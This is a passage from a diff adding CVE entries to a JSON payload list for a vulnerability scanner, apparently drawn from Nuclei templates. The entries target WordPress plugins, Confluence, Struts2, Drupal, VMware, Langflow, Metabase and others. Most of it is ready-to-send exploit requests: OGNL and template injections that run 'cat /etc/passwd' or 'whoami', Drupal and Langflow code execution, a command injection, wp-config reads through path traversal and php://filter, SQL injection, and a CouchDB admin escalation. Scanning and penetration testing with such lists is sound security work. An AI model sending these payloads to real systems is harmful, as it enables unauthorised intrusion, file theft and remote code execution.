+          "id": "nuclei_cve_2026_48710",
+          "name": "CVE-2026-48710 Starlette - Improper Validation of Unsafe Equivalence in Input",
+          "payload": "/mcp-rest/test/connection",
+          "description": "[Nuclei] Starlette - Improper Validation of Unsafe Equivalence in Input",
+          "risk": "critical",
+          "cve": "CVE-2026-48710",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-48710",
+          "applies_to": {
+            "path_contains": [
+              "mcp-rest",
+              "test"
+            ]
+          },
+          "body": "{\"transport\":\"stdio\",\"command\":\"echo\",\"args\":[\"test\"]}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_57827",
+          "name": "CVE-2026-57827 RSFiles! for Joomla - Arbitrary File Upload",
+          "payload": "/index.php?option=com_rsfiles&task=rsfiles.checkupload",
+          "description": "[Nuclei] RSFiles! for Joomla - Arbitrary File Upload",
+          "risk": "critical",
+          "cve": "CVE-2026-57827",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-57827",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          },
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_72898",
+          "name": "CVE-2026-72898 Metabase - Unauthenticated SQL Injection",
+          "payload": "/api/session/reset_password",
+          "description": "[Nuclei] Metabase - Unauthenticated SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-72898",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-72898",
+          "applies_to": {
+            "path_contains": [
+              "session"
+            ]
+          },
+          "body": "{\"token\":{\"select\":1},\"password\":\"TestPassword1!\"}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_8037",
+          "name": "CVE-2026-8037 Progress ADC LoadMaster - Command Injection",
+          "payload": "/accessv2",
+          "description": "[Nuclei] Progress ADC LoadMaster - Command Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-8037",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://community.progress.com/s/article/LoadMaster-Critical-Security-Bulletin-June-2026-CVE-2026-8037-CVE-2026-33691",
+          "applies_to": {
+            "path_contains": [
+              "accessv2"
+            ]
+          },
+          "body": "{\"cmd\": \"getall\", \"apiuser\": \"''''\", \"apipass\": \"BBBBB\", \"g0\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g1\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g2\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g3\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g4\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g5\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g6\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g7\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g8\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g9\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g10\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g11\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g12\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g13\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g14\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g15\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g16\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g17\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g18\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g19\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g20\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g21\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g22\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g23\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g24\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g25\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g26\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g27\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g28\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g29\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g30\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g31\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g32\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g33\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g34\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g35\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g36\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g37\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g38\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g39\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g40\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g41\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g42\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g43\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g44\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g45\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g46\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g47\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g48\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g49\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g50\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g51\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g52\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g53\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g54\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g55\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g56\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g57\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g58\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g59\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\", \"g60\": \"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\"}",
+          "headers": {
+            "Content-Type": "application/json",
+            "Accept": "*/*"
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_1661",
+          "name": "CVE-2025-1661 HUSKY – Products Filter Professional for WooCommerce <= 1.3.6.5 - Unauthenticate",
+          "payload": "/wp-admin/admin-ajax.php?template=../../../../../../../wp-config&value=a&min_symbols=1",
+          "description": "[Nuclei] HUSKY – Products Filter Professional for WooCommerce <= 1.3.6.5 - Unauthenticate",
+          "risk": "critical",
+          "cve": "CVE-2025-1661",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/woocommerce-products-filter/husky-products-filter-professional-for-woocommerce-1365-unauthenticated-local-file-inclusion",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "action=woof_text_search&",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_3248",
+          "name": "CVE-2025-3248 Langflow AI - Unauthenticated Remote Code Execution",
+          "payload": "/api/v1/validate/code",
+          "description": "[Nuclei] Langflow AI - Unauthenticated Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2025-3248",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://github.com/langflow-ai/langflow/pull/6911",
+          "applies_to": {
+            "powered_by": [
+              "python"
+            ]
+          },
+          "body": "{\"code\": \"@exec('raise Exception(__import__(\\\"subprocess\\\").check_output([\\\"cat\\\", \\\"/etc/passwd\\\"]))')\\ndef foo():\\n  pass\"}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_34077",
+          "name": "CVE-2025-34077 WordPress Pie Register <= 3.7.1.4 - Authentication Bypass",
+          "payload": "/",
+          "description": "[Nuclei] WordPress Pie Register <= 3.7.1.4 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2025-34077",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-34077",
+          "applies_to": {
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "user_id_social_site=1&social_site=true&piereg_login_after_registration=true&_wp_http_referer=/login/&log=null&pwd=null",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_4380",
+          "name": "CVE-2025-4380 Ads Pro Plugin <= 4.89 - Local File Inclusion",
+          "payload": "/wp-admin/admin-ajax.php",
+          "description": "[Nuclei] Ads Pro Plugin <= 4.89 - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2025-4380",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-4380",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "action=bsa_preview_callback&bsa_template=../php/example",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_10571",
+          "name": "CVE-2024-10571 Chartify – WordPress Chart Plugin < 2.9.6 - Local File Inclusion",
+          "payload": "/wp-admin/admin-ajax.php?action=add&source=../../../../../../../../../../wp-content/plugins/chart-builder/admin/partials/features/chart-builder-plugin-featured-display&type=chart-js",
+          "description": "[Nuclei] Chartify – WordPress Chart Plugin < 2.9.6 - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2024-10571",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-10571",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "action=ays_chart_admin_ajax&function=display_plugin_charts_page&",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_10763",
+          "name": "CVE-2024-10763 WordPress Campress Theme <= 1.35 - Unauthenticated Local File Inclusion",
+          "payload": "/wp-admin/admin-ajax.php",
+          "description": "[Nuclei] WordPress Campress Theme <= 1.35 - Unauthenticated Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2024-10763",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-themes/campress/campress-135-unauthenticated-local-file-inclusion",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "action=campress_woocommerce_get_ajax_products&layout=php://filter/convert.base64-encode/resource=/var/www/html/wp-config",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_4577",
+          "name": "CVE-2024-4577 PHP CGI - Argument Injection",
+          "payload": "/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+          "description": "[Nuclei] PHP CGI - Argument Injection",
+          "risk": "critical",
+          "cve": "CVE-2024-4577",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://s4e.io/tools/php-cgi-code-injection-cve-2024-4577",
+          "applies_to": {
+            "path_contains": [
+              "php-cgi",
+              "php-cgi.exe"
+            ],
+            "powered_by": [
+              "php"
+            ]
+          },
+          "body": "<?php echo md5(\"CVE-2024-4577\"); ?>\n"
+        },
+        {
+          "id": "nuclei_cve_2024_50498",
+          "name": "CVE-2024-50498 WP Query Console <= 1.0 - Remote Code Execution",
+          "payload": "/index.php?rest_route=/wqc/v1/query",
+          "description": "[Nuclei] WP Query Console <= 1.0 - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2024-50498",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-50498",
+          "applies_to": {
+            "path_contains": [
+              "wqc"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "{\"queryArgs\":\"phpinfo();\",\"queryType\":\"post\"}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_5488",
+          "name": "CVE-2024-5488 SEOPress < 7.9 - Authentication Bypass",
+          "payload": "/wp-json/seopress/v1/posts/1/title-description-metas",
+          "description": "[Nuclei] SEOPress < 7.9 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2024-5488",
+          "location": "path",
+          "param": "",
+          "method": "PUT",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-5488",
+          "applies_to": {
+            "path_contains": [
+              "wp-json",
+              "seopress"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_8353",
+          "name": "CVE-2024-8353 GiveWP Donation Plugin <= 3.16.1 - Unauthenticated PHP Object Injection",
+          "payload": "/wp-admin/admin-ajax.php",
+          "description": "[Nuclei] GiveWP Donation Plugin <= 3.16.1 - Unauthenticated PHP Object Injection",
+          "risk": "critical",
+          "cve": "CVE-2024-8353",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-8353",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "action=give_form_search",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_9707",
+          "name": "CVE-2024-9707 Hunk Companion <= 1.8.4 - Arbitrary Plugin Installation",
+          "payload": "/wp-json/hc/v1/themehunk-import",
+          "description": "[Nuclei] Hunk Companion <= 1.8.4 - Arbitrary Plugin Installation",
+          "risk": "critical",
+          "cve": "CVE-2024-9707",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-9707",
+          "applies_to": {
+            "path_contains": [
+              "wp-json"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "{\"params\": {\"templateType\": \"free\", \"plugin\": {\"wp-file-manager\": \"Wp File Manager\"}, \"allPlugins\": [{\"wp-file-manager\": \"wp-file-manager/wp-file-manager.php\"}], \"builder\": \"gogo\", \"themeSlug\": \"gogo\", \"proThemePlugin\": \"wp-file-manager\", \"tmplFreePro\": \"plugin\", \"wpUrl\": \"https://downloads.wordpress.org/\", \"thUrl\": \"https://themehunk.com/wp/data/\"}}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_1020",
+          "name": "CVE-2023-1020 Steveas WP Live Chat Shoutbox <= 1.4.2 - SQL Injection",
+          "payload": "/wp-admin/admin-ajax.php",
+          "description": "[Nuclei] Steveas WP Live Chat Shoutbox <= 1.4.2 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2023-1020",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-1020",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "action=shoutbox-ajax-update-messages&last_timestamp=0)+UNION+ALL+SELECT+NULL,NULL,(SELECT+CONCAT(0x6338633630353939396633643833353264376262373932636633666462323562)),NULL,NULL,NULL,NULL,NULL--+&rooms%5B%5D=default",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_22527",
+          "name": "CVE-2023-22527 Atlassian Confluence - Remote Code Execution",
+          "payload": "/template/aui/text-inline.vm",
+          "description": "[Nuclei] Atlassian Confluence - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2023-22527",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://confluence.atlassian.com/pages/viewpage.action?pageId=1333335615",
+          "applies_to": {
+            "path_contains": [
+              "template",
+              "aui"
+            ],
+            "powered_by": [
+              "confluence"
+            ]
+          },
+          "body": "label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.poc[0],{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\\u0027x_vuln_check\\u0027,(new+freemarker.template.utility.Execute()).exec({\"whoami\"}))",
+          "headers": {
+            "Accept-Encoding": "gzip, deflate, br",
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_22956",
+          "name": "CVE-2022-22956 VMware Workspace ONE Access - Authentication Bypass",
+          "payload": "/SAAS/API/1.0/REST/oauth2/generateActivationToken/Service__OAuth2Client",
+          "description": "[Nuclei] VMware Workspace ONE Access - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2022-22956",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-22956",
+          "applies_to": {
+            "path_contains": [
+              "saas"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          },
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": "0"
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_21978",
+          "name": "CVE-2021-21978 VMware View Planner <4.6 SP1- Remote Code Execution",
+          "payload": "/logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D",
+          "description": "[Nuclei] VMware View Planner <4.6 SP1- Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2021-21978",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-21978",
+          "applies_to": {
+            "path_contains": [
+              "logupload"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          },
+          "body": "------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"logfile\"; filename=\"\"\nContent-Type: text/plain\n\nPOC_TEST\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS",
+          "headers": {
+            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS",
+            "Accept": "text/html",
+            "Referer": "",
+            "Connection": "close"
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_21985",
+          "name": "CVE-2021-21985 VMware vSphere Client (HTML5) - Remote Code Execution",
+          "payload": "/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData",
+          "description": "[Nuclei] VMware vSphere Client (HTML5) - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2021-21985",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-21985",
+          "applies_to": {
+            "path_contains": [
+              "h5-vsan"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          },
+          "body": "{\"methodInput\":[{\"type\":\"ClusterComputeResource\",\"value\": null,\"serverGuid\": null}]}",
+          "headers": {
+            "Accept": "*/*",
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_31805",
+          "name": "CVE-2021-31805 Apache Struts2 S2-062 - Remote Code Execution",
+          "payload": "/",
+          "description": "[Nuclei] Apache Struts2 S2-062 - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2021-31805",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-31805",
+          "applies_to": {
+            "server": [
+              "apache"
+            ],
+            "powered_by": [
+              "struts"
+            ]
+          },
+          "body": "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Disposition: form-data; name=\"id\"\n\n%{\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'cat /etc/passwd'}))\n}\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF—",
+          "headers": {
+            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF",
+            "Content-Length": "1095"
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_3952",
+          "name": "CVE-2020-3952 VMware vCenter Server LDAP Broken Access Control",
+          "payload": "/sdk/",
+          "description": "[Nuclei] VMware vCenter Server LDAP Broken Access Control",
+          "risk": "critical",
+          "cve": "CVE-2020-3952",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-3952",
+          "applies_to": {
+            "path_contains": [
+              "sdk"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          },
+          "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n   <soap:Header>\n      <operationID>00000001-00000001</operationID>\n   </soap:Header>\n   <soap:Body>\n      <RetrieveServiceContent xmlns=\"urn:internalvim25\">\n         <_this xsi:type=\"ManagedObjectReference\" type=\"ServiceInstance\">ServiceInstance</_this>\n      </RetrieveServiceContent>\n   </soap:Body>\n</soap:Envelope>",
+          "headers": {
+            "Content-Type": "text/xml",
+            "SOAPAction": "\"urn:vim25/6.5\""
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_3396",
+          "name": "CVE-2019-3396 Atlassian Confluence Server - Path Traversal",
+          "payload": "/rest/tinymce/1/macro/preview",
+          "description": "[Nuclei] Atlassian Confluence Server - Path Traversal",
+          "risk": "critical",
+          "cve": "CVE-2019-3396",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-3396",
+          "applies_to": {
+            "path_contains": [
+              "rest",
+              "tinymce"
+            ],
+            "powered_by": [
+              "confluence"
+            ]
+          },
+          "body": "{\"contentId\":\"786457\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc5\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}}}",
+          "headers": {
+            "Referer": ""
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_7609",
+          "name": "CVE-2019-7609 Kibana Timelion - Arbitrary Code Execution",
+          "payload": "/api/timelion/run",
+          "description": "[Nuclei] Kibana Timelion - Arbitrary Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2019-7609",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-7609",
+          "applies_to": {
+            "path_contains": [
+              "timelion"
+            ],
+            "powered_by": [
+              "kibana"
+            ]
+          },
+          "body": "{\"sheet\":[\".es(*)\"],\"time\":{\"from\":\"now-1m\",\"to\":\"now\",\"mode\":\"quick\",\"interval\":\"auto\",\"timezone\":\"Asia/Shanghai\"}}",
+          "headers": {
+            "Content-Type": "application/json; charset=utf-8"
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_7600",
+          "name": "CVE-2018-7600 Drupal - Remote Code Execution",
+          "payload": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+          "description": "[Nuclei] Drupal - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2018-7600",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-7600",
+          "applies_to": {
+            "path_contains": [
+              "register"
+            ],
+            "powered_by": [
+              "drupal"
+            ]
+          },
+          "body": "-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#post_render][]\"\n\npassthru\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#type]\"\n\nmarkup\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#markup]\"\n\ncat /etc/passwd\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"form_id\"\n\nuser_register_form\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"_drupal_ajax\"",
+          "headers": {
+            "Accept": "application/json",
+            "Referer": "/user/register",
+            "X-Requested-With": "XMLHttpRequest",
+            "Content-Type": "multipart/form-data; boundary=---------------------------99533888113153068481322586663"
+          }
+        },
+        {
+          "id": "nuclei_cve_2017_12635",
+          "name": "CVE-2017-12635 Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Escalation",
+          "payload": "/_users/org.couchdb.user:poc",
+          "description": "[Nuclei] Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Escalation",
+          "risk": "critical",
+          "cve": "CVE-2017-12635",
+          "location": "path",
+          "param": "",
+          "method": "PUT",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-12635",
+          "applies_to": {
+            "path_contains": [
+              "_users"
+            ],
+            "server": [
+              "apache"
+            ]
+          },
+          "body": "{\n  \"type\": \"user\",\n  \"name\": \"poc\",\n  \"roles\": [\"_admin\"],\n  \"roles\": [],\n  \"password\": \"123456\"\n}",
+          "headers": {
+            "Accept": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2013_1965",
+          "name": "CVE-2013-1965 Apache Struts2 S2-012 RCE",
+          "payload": "/user.action",
+          "description": "[Nuclei] Apache Struts2 S2-012 RCE",
+          "risk": "critical",
+          "cve": "CVE-2013-1965",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2013-1965",
+          "applies_to": {
+            "path_contains": [
+              "user.action"
+            ],
+            "server": [
+              "apache"
+            ],
+            "powered_by": [
+              "struts"
+            ]
+          },
+          "body": "name=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C+%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D\n",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_27817",
+          "name": "CVE-2025-27817 Apache Kafka Client - Arbitrary File Read",
+          "payload": "/druid/indexer/v1/sampler?for=connect",
+          "description": "[Nuclei] Apache Kafka Client - Arbitrary File Read",
+          "risk": "high",
+          "cve": "CVE-2025-27817",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-27817",
+          "applies_to": {
+            "path_contains": [
+              "druid",
+              "indexer"
+            ],
+            "server": [
+              "apache"
+            ]
+          },
